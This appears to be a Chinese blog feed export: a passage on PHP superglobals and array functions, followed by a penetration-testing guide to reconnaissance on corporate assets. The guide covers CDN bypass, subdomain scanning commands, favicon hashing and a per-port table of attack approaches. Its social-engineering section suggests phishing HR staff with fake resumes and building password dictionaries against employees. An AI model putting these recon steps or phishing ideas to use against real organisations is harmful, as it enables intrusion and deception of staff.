<p>修改<code>test.php</code>中的<code>form</code>表单为文件上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;.&#x2F;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;	</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<p>访问<code>test.php</code>文件随便上传一个文件</p>
<p><img src="https://qiniu.hzktester.top/tp2020110605.png" alt="image"></p>
<p><code>index.php</code>文件中输出提交文件的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_FILES);</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020110606.png" alt="image"></p>
<h3 id="HTTP-COOKIES变量：-COOKIE"><a href="#HTTP-COOKIES变量：-COOKIE" class="headerlink" title="HTTP COOKIES变量：$_COOKIE"></a>HTTP COOKIES变量：$_COOKIE</h3><p>获取<code>COOKIE</code>变量输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($_COOKIE);</span><br></pre></td></tr></table></figure>
<h3 id="SESSION变量：-SESSION"><a href="#SESSION变量：-SESSION" class="headerlink" title="SESSION变量：$_SESSION"></a>SESSION变量：$_SESSION</h3><p>获取<code>SESSION</code>变量输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;这里一定要开启session_start()</span><br><span class="line">session_start();</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure>
<h3 id="GLOBAL变量：-GLOBALS"><a href="#GLOBAL变量：-GLOBALS" class="headerlink" title="GLOBAL变量：$GLOBALS"></a>GLOBAL变量：$GLOBALS</h3><p>获取全局参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020110607.png" alt="image"></p>
<h2 id="数组的相关处理函数"><a href="#数组的相关处理函数" class="headerlink" title="数组的相关处理函数"></a>数组的相关处理函数</h2><h3 id="数组的键-值操作函数"><a href="#数组的键-值操作函数" class="headerlink" title="数组的键/值操作函数"></a>数组的键/值操作函数</h3><ul>
<li><code>array_values</code>：返回数组中所有的值  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);</span><br><span class="line">$values &#x3D; array_values($a);</span><br><span class="line">var_dump($values); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;array(3)&#123;[0]&#x3D;&gt;string(4)&quot;张三&quot;  [1]&#x3D;&gt;int(20)  [2]&#x3D;&gt;string(2)&quot;男&quot;&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_keys</code>：返回数组中所有的键名  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);</span><br><span class="line">$keys &#x3D; array_keys($a);</span><br><span class="line">for($i&#x3D;0;$i&lt;count($keys);$i++)&#123;</span><br><span class="line">	echo $keys[$i].&quot;&amp;nbsp;&quot;;  &#x2F;&#x2F;name age sex </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
<li><code>in_array</code>：检查数组中是否存在某个值  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);</span><br><span class="line">if(in_array(&quot;张三&quot;,$a))&#123;</span><br><span class="line">    echo &quot; ‘张三’在\$a数组中&quot;;   &#x2F;&#x2F;”张三“在$a数组中</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_flip</code>：交换数组中的键和值  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);  </span><br><span class="line">$b &#x3D; array_flip($a);</span><br><span class="line">foreach($b as $k&#x3D;&gt;$v)&#123;  </span><br><span class="line">    echo &quot;$k&#x3D;&gt;$v&quot;;  &#x2F;&#x2F; 张三&#x3D;&gt;name 20&#x3D;&gt;age 男&#x3D;&gt;sex </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_reverse</code>：返回一个单元顺序相反的数组  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; array(&quot;name&quot;&#x3D;&gt;&quot;张三&quot;,&quot;age&quot;&#x3D;&gt;20,&quot;sex&quot;&#x3D;&gt;&quot;男&quot;);  </span><br><span class="line">$b &#x3D; array_reverse($a);</span><br><span class="line">foreach($b as $k&#x3D;&gt;$v)&#123;  </span><br><span class="line">    echo &quot;$k&#x3D;&gt;$v&quot;;  &#x2F;&#x2F; sex&#x3D;&gt;男 age&#x3D;&gt;20 name&#x3D;&gt;张三 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="统计数组元素的个数与唯一性"><a href="#统计数组元素的个数与唯一性" class="headerlink" title="统计数组元素的个数与唯一性"></a>统计数组元素的个数与唯一性</h3>定义一个数组：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; [1,2,3,4,5,6,6,7,8,4];</span><br></pre></td></tr></table></figure></li>
<li><code>count</code>：统计数组的长度  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(count($a));</span><br><span class="line">&#x2F;&#x2F;输出int(10)</span><br></pre></td></tr></table></figure></li>
<li><code>array_count_values</code>：统计数组中所有的值出现的次数  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(array_count_values($a));</span><br><span class="line">&#x2F;&#x2F;输出array(8) &#123; [1]&#x3D;&gt; int(1) [2]&#x3D;&gt; int(1) [3]&#x3D;&gt; int(1) [4]&#x3D;&gt; int(2) [5]&#x3D;&gt; int(1) [6]&#x3D;&gt; int(2) [7]&#x3D;&gt; int(1) [8]&#x3D;&gt; int(1) &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_unique</code>：数组去重  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(array_unique($a));</span><br><span class="line">&#x2F;&#x2F;输出array(8) &#123; [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; int(2) [2]&#x3D;&gt; int(3) [3]&#x3D;&gt; int(4) [4]&#x3D;&gt; int(5) [5]&#x3D;&gt; int(6) [7]&#x3D;&gt; int(7) [8]&#x3D;&gt; int(8) &#125;</span><br></pre></td></tr></table></figure>
<h3 id="使用回调函数处理数组的函数"><a href="#使用回调函数处理数组的函数" class="headerlink" title="使用回调函数处理数组的函数"></a>使用回调函数处理数组的函数</h3>定义一个数组：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; [1,2,3,4,5,6,6,7,8,4];</span><br></pre></td></tr></table></figure></li>
<li><code>array_filter</code>：用回调函数过滤数组中的单元，键值保持不变  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   var_dump(array_filter($a,&#39;test&#39;));</span><br><span class="line">function test($id)&#123;</span><br><span class="line">	if($id &#x3D;&#x3D; 4)&#123;	&#x2F;&#x2F;只保留值为4的</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">	return false;</span><br><span class="line">	var_dump(func_get_args());</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;输出array(2) &#123; [3]&#x3D;&gt; int(4) [9]&#x3D;&gt; int(4) &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_walk</code>：对数组中的每个成员应用用户函数  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myfunction(&amp;$value,$key)</span><br><span class="line">&#123;</span><br><span class="line">	$value&#x3D;&quot;yellow&quot;;    &#x2F;&#x2F;将数组a的所有值改为yellow</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;array(&quot;a&quot;&#x3D;&gt;&quot;red&quot;,&quot;b&quot;&#x3D;&gt;&quot;green&quot;,&quot;c&quot;&#x3D;&gt;&quot;blue&quot;);</span><br><span class="line">array_walk($a,&quot;myfunction&quot;);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(3) &#123; [&quot;a&quot;]&#x3D;&gt; string(6) &quot;yellow&quot; [&quot;b&quot;]&#x3D;&gt; string(6) &quot;yellow&quot; [&quot;c&quot;]&#x3D;&gt; string(6) &quot;yellow&quot; &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_map</code>：将函数作用到数组中的每个值上，并返回带有新值的数组  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   function myfunction($v)</span><br><span class="line">&#123;</span><br><span class="line">  return($v*$v);    &#x2F;&#x2F;每个值都乘以本身</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;array(1,2,3,4,5);</span><br><span class="line">var_dump(array_map(&quot;myfunction&quot;,$a));</span><br><span class="line">&#x2F;&#x2F;返回array(5) &#123; [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; int(4) [2]&#x3D;&gt; int(9) [3]&#x3D;&gt; int(16) [4]&#x3D;&gt; int(25) &#125;</span><br></pre></td></tr></table></figure>
<h3 id="数组的排序函数"><a href="#数组的排序函数" class="headerlink" title="数组的排序函数"></a>数组的排序函数</h3></li>
<li><code>sort</code>：对数组排序(升序)</li>
<li><code>rsort</code>：对数组逆向排序（降序）</li>
<li><code>usort</code>：使用用户自定义的比较函数对数组中的值进行排序</li>
<li><code>asort</code>：对数组进行排序并保持索引关系（关联数组排序）</li>
<li><code>arsort</code>：对数组进行逆向排序并保持索引关系 </li>
<li><code>uasort</code>：用户自定义的比较函数对数组进行排序并保持索引关联</li>
<li><code>ksort</code>：对数组按照键名排序</li>
<li><code>krsort</code>：对数组按照键名逆向排序</li>
<li><code>uksort</code>：使用用户自定义的比较函数对数组中的键名进行排序</li>
<li><code>natsort</code>：用“自然排序”算法对数组排序</li>
<li><code>natcasesort</code>：用“自然排序”算法对数组不区分大小写字母排序 </li>
<li><code>array_multisort</code>：对多个数组或多维数组进行排序</li>
</ul>
<h3 id="拆分、合并、分解与结合数组"><a href="#拆分、合并、分解与结合数组" class="headerlink" title="拆分、合并、分解与结合数组"></a>拆分、合并、分解与结合数组</h3><ul>
<li><p><code>array_splice</code>：把数组中的一部分去掉并用其它值取代</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $a &#x3D; [1,2,3,4,5,6,6,7,8,4]; &#x2F;&#x2F;定义一个数组a</span><br><span class="line">   array_splice($a,0,5,[10]);  &#x2F;&#x2F;把数组下标从0-5的所有值去掉替换为10</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(6) &#123; [0]&#x3D;&gt; int(10) [1]&#x3D;&gt; int(6) [2]&#x3D;&gt; int(6) [3]&#x3D;&gt; int(7) [4]&#x3D;&gt; int(8) [5]&#x3D;&gt; int(4) &#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>array_combine</code>：创建一个数组，用一个数组的值作为其键名，另一个数组的值作为其值</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$k &#x3D; [&#39;key1&#39;,&#39;key2&#39;];</span><br><span class="line">$v &#x3D; [&#39;value1&#39;,&#39;value2&#39;];</span><br><span class="line">$a &#x3D; array_combine($k,$v);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(2) &#123; [&quot;key1&quot;]&#x3D;&gt; string(6) &quot;value1&quot; [&quot;key2&quot;]&#x3D;&gt; string(6) &quot;value2&quot; &#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>array_merge</code>：将一个或多个数组的单元合并起来，一个数组中的值附加在前一个数组的后面。返回作为结果的数组。</p>
<blockquote>
<p>如果输入的数组中有相同的字符串键名，则该键名后面的值将覆盖前一个值。然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。 </p>
</blockquote>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $k &#x3D; [&#39;key1&#39;,&#39;key2&#39;];</span><br><span class="line">$v &#x3D; [&#39;value1&#39;,&#39;value2&#39;];</span><br><span class="line">$a &#x3D; array_merge($k,$v);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(4) &#123; [0]&#x3D;&gt; string(4) &quot;key1&quot; [1]&#x3D;&gt; string(4) &quot;key2&quot; [2]&#x3D;&gt; string(6) &quot;value1&quot; [3]&#x3D;&gt; string(6) &quot;value2&quot; &#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>array_intersect</code>：计算数组的交集，返回一个数组，该数组包含了所有在 array1 中也同时出现在所有其它参数数组中的值。注意键名保留不变。</p>
</li>
<li><p><code>array_diff</code>：计算数组的差集，返回一个数组，该数组包括了所有在 array1 中但是不在任何其它参数数组中的值。注意键名保留不变。</p>
</li>
</ul>
<h3 id="数组与数据结构"><a href="#数组与数据结构" class="headerlink" title="数组与数据结构"></a>数组与数据结构</h3><p>定义一个数组：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; [1,2,3,4,5,6,6,7,8,4];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>array_pop</code>：将数组最后一个单元弹出（出栈）  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $a &#x3D; array_pop($a);</span><br><span class="line">var_dump($a);   &#x2F;&#x2F;输出int(4)</span><br></pre></td></tr></table></figure></li>
<li><code>array_push</code>：将一个或多个单元压入数组的末尾（入栈）  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   array_push($a,10);  &#x2F;&#x2F;将10插入数组末尾</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;输出array(11) &#123; [0]&#x3D;&gt; int(1) [1]&#x3D;&gt; int(2) [2]&#x3D;&gt; int(3) [3]&#x3D;&gt; int(4) [4]&#x3D;&gt; int(5) [5]&#x3D;&gt; int(6) [6]&#x3D;&gt; int(6) [7]&#x3D;&gt; int(7) [8]&#x3D;&gt; int(8) [9]&#x3D;&gt; int(4) [10]&#x3D;&gt; int(10) &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>array_shift</code>：将数组开头的单元移出数组</li>
<li><code>array_unshift</code>：在数组开头插入一个或多个单元</li>
</ul>
<h3 id="其他有用的数组处理函数"><a href="#其他有用的数组处理函数" class="headerlink" title="其他有用的数组处理函数"></a>其他有用的数组处理函数</h3><ul>
<li><code>array_rand</code>：从数组中随机取出一个或多个单元  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   $a &#x3D; array_rand($a);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;随机输出一个数组a的值，每次刷新基本值都会变</span><br></pre></td></tr></table></figure></li>
<li><code>shuffle</code>：将数组打乱  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   shuffle($a);</span><br><span class="line">var_dump($a);</span><br><span class="line">&#x2F;&#x2F;数组打乱输出</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>边界资产信息搜集</title>
    <url>/posts/e0d0a34b.html</url>
    <content><![CDATA[<p>当有一个很大的集团目标时，一般的信息搜集流程如下：</p>
<h1 id="集团结构："><a href="#集团结构：" class="headerlink" title="集团结构："></a>集团结构：</h1><p>主要提取出历史网站备案，域名、子公司域名、备案号、注册邮箱（邮箱@后的也可能是域名）、手机号。</p>
<ul>
<li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li>
<li>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></li>
<li>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></li>
</ul>
<h2 id="备案号查同备案的网站"><a href="#备案号查同备案的网站" class="headerlink" title="备案号查同备案的网站"></a>备案号查同备案的网站</h2><ul>
<li><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">https://beian.miit.gov.cn/#/Integrated/recordQuery</a></p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110906.png" alt="image"></p>
</li>
</ul>
<h2 id="主域名中的跳转链接、JS中的链接搜集"><a href="#主域名中的跳转链接、JS中的链接搜集" class="headerlink" title="主域名中的跳转链接、JS中的链接搜集"></a>主域名中的跳转链接、JS中的链接搜集</h2><p>集团结构信息搜集后一般会得到主域名，也就是官网信息，可能有很多跳转链接，也属于他的资产，包括JS中的链接。推荐使用这个工具进行提取：</p>
<ul>
<li>jsfinder（扫API和子域名）：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.baidu.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="深挖更多IP资产："><a href="#深挖更多IP资产：" class="headerlink" title="深挖更多IP资产："></a>深挖更多IP资产：</h1><h2 id="CDN："><a href="#CDN：" class="headerlink" title="CDN："></a>CDN：</h2><h4 id="根据域名查是否有CDN："><a href="#根据域名查是否有CDN：" class="headerlink" title="根据域名查是否有CDN："></a>根据域名查是否有CDN：</h4><ul>
<li><p>多地<code>ping</code>：<a href="https://tools.ipip.net/httphead.php">https://tools.ipip.net/httphead.php</a>。如果返回都是一样的IP那就没有CDN</p>
</li>
<li><p><code>Nslookup</code>：Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110907.png" alt="image"></p>
</li>
</ul>
<h4 id="CDN绕过找到真实IP："><a href="#CDN绕过找到真实IP：" class="headerlink" title="CDN绕过找到真实IP："></a>CDN绕过找到真实IP：</h4><ul>
<li>全球<code>ping</code>：<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a>（针对小厂CDN，国外访问可能获得真实IP）</li>
<li>注册查看邮件原文</li>
<li>历史解析：<ul>
<li><code>DNSdumpster</code>（在线）：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
<li>历史<code>DNS</code>记录：<a href="https://rapiddns.io/subdomain">https://rapiddns.io/subdomain</a></li>
</ul>
</li>
<li>配置不当<ul>
<li><code>phpinfo</code></li>
<li>站点同时支持<code>http</code>和<code>https</code>访问，<code>CDN</code>只配置 <code>https</code>协议，那么这时访问<code>http</code>就可以轻易绕过。</li>
<li>其他信息泄露、<code>git</code>、<code>svn</code>源码</li>
</ul>
</li>
<li>通过找到的子域名辅助查找真实IP</li>
<li>查询<code>https</code>证书：<a href="https://censys.io/ipv4">https://censys.io/ipv4</a></li>
</ul>
<h4 id="确认是否为真实IP："><a href="#确认是否为真实IP：" class="headerlink" title="确认是否为真实IP："></a>确认是否为真实IP：</h4><ul>
<li>直接访问IP和访问域名的结果是一样的。</li>
</ul>
<h2 id="IP资产证明："><a href="#IP资产证明：" class="headerlink" title="IP资产证明："></a>IP资产证明：</h2><p>当拿到很多IP之后，如何确定是不是目标的资产？</p>
<ul>
<li>查IP归属：<a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a>（如果查到是阿里云或者腾讯云的基本可以放弃）</li>
<li>网站logo</li>
<li>网站底部版权声明</li>
</ul>
<h2 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h2><ul>
<li><a href="https://gobies.org/">goby</a>扫C段（说不定就扫到命令执行了呢）</li>
<li><a href="https://nmap.org/">nmap</a>扫全端口</li>
<li>同IP网站查询其他域名：<a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a></li>
</ul>
<h1 id="子域名搜集，目录扫描："><a href="#子域名搜集，目录扫描：" class="headerlink" title="子域名搜集，目录扫描："></a>子域名搜集，目录扫描：</h1><h2 id="子域名搜集"><a href="#子域名搜集" class="headerlink" title="子域名搜集"></a>子域名搜集</h2><p>通过以上的信息搜集，就会得到很多域名。子域名收集。推荐一个工具<a href="https://paper.seebug.org/1053/"><strong>OneForAll</strong></a></p>
<p><strong>能扫到多级目录，多，有标题</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 oneforall.py --target example.com --port&#x3D;80,443,8080,8009,7001 --valid&#x3D;True --path&#x3D;.&#x2F;subs.csv run</span><br><span class="line"></span><br><span class="line">--port&#x3D;PORT</span><br><span class="line">请求验证子域的端口范围(默认只探测80端口)</span><br><span class="line">--valid&#x3D;VALID</span><br><span class="line">只导出存活的子域结果(默认False)</span><br><span class="line">--path&#x3D;PATH</span><br><span class="line">结果保存路径(默认None)</span><br><span class="line">--takeover&#x3D;TAKEOVER</span><br><span class="line">检查子域接管(默认False)</span><br></pre></td></tr></table></figure>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>遇见、<a href="https://github.com/shack2/SWebScan">swebscan</a></p>
<p>访问域名404或者403的，权重高的直接批量扫目录（字典要强大，说不定就扫到源码了呢）</p>
<h1 id="拓展资产搜集"><a href="#拓展资产搜集" class="headerlink" title="拓展资产搜集"></a>拓展资产搜集</h1><h2 id="FOFA关键词搜集："><a href="#FOFA关键词搜集：" class="headerlink" title="FOFA关键词搜集："></a>FOFA关键词搜集：</h2><p>师傅这篇文章写的很详细了可以参考一下：<a href="https://mp.weixin.qq.com/s?__biz=MzU3MTU3NDk4Mw==&mid=2247484420&idx=1&sn=a18a908a0146b6fd08a9533520b9bc4b&chksm=fcdf5baccba8d2ba592cdeca87ded3b97915c5b0f557b18f7b6e152e4bc66d4141eddc105d5d&mpshare=1&scene=23&srcid=1104qlIdyYCsgUX58hjx7iAp&sharer_sharetime=1604499225727&sharer_shareid=1f9f9a5c0563a1d0ce3d7b29ade29fd3#rd">链接</a></p>
<h2 id="微信公众号搜集："><a href="#微信公众号搜集：" class="headerlink" title="微信公众号搜集："></a>微信公众号搜集：</h2><ul>
<li>很多集团的资产找不到的情况下，可以试一下微信搜公众号，或许会有不一样的发现</li>
<li>找其他技术文章也一样，一般精品文章都在微信</li>
</ul>
<h2 id="APP搜集："><a href="#APP搜集：" class="headerlink" title="APP搜集："></a>APP搜集：</h2><p>反编译APK并提取所有URL链接<a href="https://github.com/s0md3v/Diggy">Diggy</a>：</p>
<p><strong>注意：</strong></p>
<ul>
<li>需要在linux下使用</li>
<li>需要安装配置<a href="https://ibotpeaches.github.io/Apktool/install/">apktool</a></li>
</ul>
<h2 id="icon搜集："><a href="#icon搜集：" class="headerlink" title="icon搜集："></a>icon搜集：</h2><p>提取集团<code>icon</code>的<code>hash</code>然后<code>fofa</code>搜：</p>
<p><code>python</code>几行代码实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import mmh3</span><br><span class="line">import requests</span><br><span class="line">import codecs</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line">response &#x3D; requests.get(url)</span><br><span class="line">favicon &#x3D; codecs.encode(response.content,&quot;base64&quot;)</span><br><span class="line">hash &#x3D; mmh3.hash(favicon)</span><br><span class="line">print(hash)</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020110908.png" alt="image"></p>
<p><img src="https://qiniu.hzktester.top/tp2020110909.png" alt="image"></p>
<h2 id="供应链，网站指纹："><a href="#供应链，网站指纹：" class="headerlink" title="供应链，网站指纹："></a>供应链，网站指纹：</h2><ul>
<li>供应链<ul>
<li>网站底部可能会有技术支持的公司名称显示</li>
<li>F12找特征<code>FOFA</code>搜可能会找到开发此网站的公司，查该公司说不定会有演示网站或者测试站或者源码</li>
</ul>
</li>
<li>指纹识别：<a href="http://finger.tidesec.net/">潮汐指纹</a>、<a href="https://www.yunsee.cn/">云悉指纹</a></li>
</ul>
<h2 id="一些好用的谷歌插件："><a href="#一些好用的谷歌插件：" class="headerlink" title="一些好用的谷歌插件："></a>一些好用的谷歌插件：</h2><ul>
<li><p><code>wappalyzer</code>：查看网站使用了哪些技术,配合上<code>FOFA</code>就可以更快熟悉目标。</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110901.png" alt="image"></p>
</li>
<li><p><code>FOFA Pro View</code>：查看网站IP,以及开放的端口，同IP网站等</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110902.png" alt="image"></p>
</li>
<li><p><code>EditThisCookie</code>：可以很方便修改已保存的<code>cookie</code></p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110903.png" alt="image"></p>
</li>
<li><p><code>User-Agent</code>：可以快速修改请求ua(某些url只能用手机访问)</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110904.png" alt="image"></p>
</li>
<li><p><code>X-Forwarded-For Header</code>：可以很方便的在请求里面加<code>X-Forwarded-For</code>头</p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110905.png" alt="image"></p>
</li>
<li><p><code>JSONView</code>：美化<code>json</code>,方便浏览(无图脑补)</p>
</li>
<li><p><code>HackBar</code>：这个不用介绍，手艺人必备。</p>
</li>
</ul>
<h2 id="社工搜集："><a href="#社工搜集：" class="headerlink" title="社工搜集："></a>社工搜集：</h2><p>这里没研究过，提供一个思路：</p>
<ul>
<li><p>网盘搜关键词找是否有泄露的敏感文件（有些员工分享文件可能会用这个）：<a href="https://www.lingfengyun.com/">凌风云网盘</a></p>
<p>  <img src="https://qiniu.hzktester.top/tp2020110910.png" alt="image"></p>
</li>
<li><p>写脚本爬各招聘网站HR的邮箱然后发简历钓鱼</p>
</li>
<li><p>已知集团邮箱后缀，全拼姓名TOP500字典爆破验证存活的邮箱然后针对发邮件（最笨的法子了）：<a href="https://verify-email.org/">链接</a></p>
</li>
<li><p>针对某个员工生成字典撞库<a href="https://www.shentoushi.top/tools/dict/index.php">密码字典生成器</a></p>
</li>
</ul>
<h1 id="漏洞文库："><a href="#漏洞文库：" class="headerlink" title="漏洞文库："></a>漏洞文库：</h1><ul>
<li>零组文库：<a href="http://47.94.96.209/index.html">零组</a></li>
<li>乌云镜像：<a href="https://wooyun.x10sec.org/">https://wooyun.x10sec.org/</a></li>
</ul>
<h1 id="常见端口渗透思路："><a href="#常见端口渗透思路：" class="headerlink" title="常见端口渗透思路："></a>常见端口渗透思路：</h1><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>渗透思路</th>
</tr>
</thead>
<tbody><tr>
<td>21/69</td>
<td>FTP/TFTP：文件传输协议</td>
<td>爆破、内网嗅探</td>
</tr>
<tr>
<td>22</td>
<td>SSH：远程连接</td>
<td>用户名枚举、爆破</td>
</tr>
<tr>
<td>23</td>
<td>Telnet：远程连接</td>
<td>爆破、内网嗅探</td>
</tr>
<tr>
<td>25</td>
<td>SMTP：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
<td>未授权访问（通过LdapBrowser工具直接连入）</td>
</tr>
<tr>
<td>443</td>
<td>https服务</td>
<td>OpenSSL 心脏滴血（nmap -sV –script=ssl-heartbleed ）</td>
</tr>
<tr>
<td>445</td>
<td>SMB服务</td>
<td>ms17_010远程代码执行</td>
</tr>
<tr>
<td>873</td>
<td>rsync服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>1090/1099</td>
<td>Java-rmi</td>
<td>JAVA反序列化远程命令执行漏洞</td>
</tr>
<tr>
<td>1352</td>
<td>Lotus Domino邮件服务</td>
<td>爆破：弱口令、信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQL</td>
<td>注入、SA弱口令爆破、提权</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle</td>
<td>注入、TNS爆破</td>
</tr>
<tr>
<td>2049</td>
<td>NFS</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>ZooKeeper服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>MySQL</td>
<td>注入、爆破、写shell、提权</td>
</tr>
<tr>
<td>3389</td>
<td>RDP</td>
<td>爆破、Shift后门、CVE-2019-0708远程代码执行</td>
</tr>
<tr>
<td>4848</td>
<td>GlassFish控制台</td>
<td>爆破：控制台弱口令、认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>Sybase/DB2数据库</td>
<td>爆破、注入</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL</td>
<td>爆破弱口令、高权限执行系统命令</td>
</tr>
<tr>
<td>5632</td>
<td>PcAnywhere服务</td>
<td>爆破弱口令</td>
</tr>
<tr>
<td>5900</td>
<td>VNC</td>
<td>爆破：弱口令、认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>Redis</td>
<td>未授权访问、爆破弱口令</td>
</tr>
<tr>
<td>7001</td>
<td>WebLogic中间件</td>
<td>反序列化、控制台弱口令+部署war包、SSRF</td>
</tr>
<tr>
